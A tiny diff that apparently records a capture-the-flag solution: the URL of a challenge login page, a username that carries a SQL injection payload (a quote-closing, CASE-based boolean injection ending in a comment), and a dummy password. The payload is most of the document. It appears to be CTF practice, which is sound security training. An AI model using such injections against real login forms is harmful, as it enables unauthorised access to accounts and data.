@@ -1,0 +1,4 @@
+http://challenges.unitedctf.ca:1337/super_secret_login_do_not_look_plz
+
+Username: -1852")) OR 7386=(SELECT (CASE WHEN (7386=7386) THEN 7386 ELSE (SELECT 8686 UNION SELECT 7493) END))-- ZHiy
+Password: asdf
